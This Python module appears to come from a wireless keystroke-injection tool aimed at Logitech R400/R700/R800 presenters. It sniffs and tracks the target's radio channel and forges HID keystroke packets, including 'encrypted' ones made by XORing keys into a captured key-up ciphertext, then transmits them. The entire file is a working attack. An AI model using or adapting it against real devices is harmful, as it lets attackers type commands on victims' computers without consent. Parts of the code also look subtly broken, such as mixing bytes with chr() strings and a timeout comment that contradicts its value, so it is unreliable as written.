import time
import logging
import struct

from .protocol import Protocol
from lib import common
from collections import deque
from threading import Thread
from binascii import hexlify


KEYUP_REF = "00:D3:A9:CC:DE:A0:4E:4B:FD:9B:8B:98:F9:E7:00:00:00:00:00:00:00"


class Logitech(Protocol):
    """Logitech R400/R700/R800 wireless presenter"""

    def __init__(self, address, encrypted=False):
        """Constructor"""

        self.address = address
        self.encrypted = encrypted

        super(Logitech, self).__init__("Logitech")

    def configure_radio(self):
        """Configure the radio"""

        # Put the radio in sniffer mode
        common.radio.enter_sniffer_mode(self.address)

        # Set the channels to {2..77..3}
        common.channels = range(2, 77, 3)

        # Set the initial channel
        common.radio.set_channel(common.channels[0])

    def send_hid_event(self, scan_code=0, modifiers=0):
        """Send HID event"""

        # Build and enqueue the payload
        if not self.encrypted:
            # generate unencrypted payload
            print(modifiers)
            payload = b"\x00\xC1" + struct.pack("B", modifiers) + b"\x00" + struct.pack("B", scan_code) + 4 * b"\x00"
        else:
            # generate encrypted payload
            ref = bytes.fromhex(KEYUP_REF.replace(":", ""))
            idx = 8
            modidx = 2
            payload = ref
            payload = payload[0:idx] + chr(scan_code ^ ref[idx]) + payload[idx+1:]
            payload = payload[0:modidx] + chr(modifiers ^ ref[modidx]) + payload[modidx+1:]

        # Calculate and append checksum
        checksum = 0
        for b in payload:
            # checksum -= struct.unpack("B", b)[0]
            checksum -= b

        payload += struct.pack("B", checksum & 0xff)
        self.tx_queue.append(payload)

    def start_injection(self):
        """Enter injection mode"""

        # Start the TX loop
        self.cancel_tx_loop = False
        self.tx_queue = deque()
        self.tx_thread = Thread(target=self.tx_loop)
        self.tx_thread.daemon = True
        self.tx_thread.start()

    def tx_loop(self):
        """TX loop"""

        # Channel timeout
        timeout = 0.1                       # 100 ms

        # Parse the ping payload
        ping_payload = b"\x00"

        # Format the ACK timeout and auto retry values
        ack_timeout = 1                     # 500 ms
        retries = 4

        # Last packet time
        last_packet = time.time()

        # Sweep through the channels and decode ESB packets
        last_ping = time.time()
        channel_index = 0
        address_string = hexlify(self.address)

        while not self.cancel_tx_loop:

            # Follow the target device if it changes channels
            if time.time() - last_ping > timeout:

                # First try pinging on the active channel
                if not common.radio.transmit_payload(ping_payload, ack_timeout, retries):

                    # Ping failed on the active channel, so sweep through all available channels
                    success = False
                    for channel_index in range(len(common.channels)):
                        common.radio.set_channel(common.channels[channel_index])
                        if common.radio.transmit_payload(ping_payload, ack_timeout, retries):

                            # Ping successful, exit out of the ping sweep
                            last_ping = time.time()
                            logging.debug('Ping success on channel {0}'.format(common.channels[channel_index]))
                            success = True
                            break

                    # Ping sweep failed
                    if not success:
                        logging.debug('Unable to ping {0}'.format(address_string))

                # Ping succeeded on the active channel
                else:
                    logging.debug('Ping success on channel {0}'.format(common.channels[channel_index]))
                    last_ping = time.time()

            # Read from the queue
            if len(self.tx_queue):

                # Transmit the queued packet
                if time.time() - last_packet < 0.008:
                    continue
                payload = self.tx_queue.popleft()
                if not common.radio.transmit_payload(payload, ack_timeout, retries):
                    self.tx_queue.appendleft(payload)
                else:
                    last_packet = time.time()

    def stop_injection(self):
        """Leave injection mode"""

        while len(self.tx_queue):
            time.sleep(0.001)
            continue
        self.cancel_tx_loop = True
        self.tx_thread.join()
